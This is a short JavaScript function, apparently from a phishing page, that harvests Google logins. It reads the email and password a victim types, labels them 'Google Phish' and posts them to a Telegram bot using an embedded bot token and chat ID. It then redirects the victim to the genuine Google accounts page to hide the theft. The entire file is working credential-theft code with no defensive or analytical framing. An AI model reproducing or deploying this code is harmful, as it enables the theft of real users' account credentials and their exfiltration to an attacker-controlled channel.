function sendData() {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  const message = `Google Phish:\nEmail: ${email}\nPassword: ${password}`;

  fetch("https://api.telegram.org/bot7340359614:AAFXHvoBGPrp_q7ZWXRZP3qaybhvq9gntTw/sendMessage", {
    method: "POST",
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: `chat_id=6466187930&text=${encodeURIComponent(message)}`
  }).then(() => {
    window.location.href = "https://accounts.google.com"; // redirect asli
  });
}
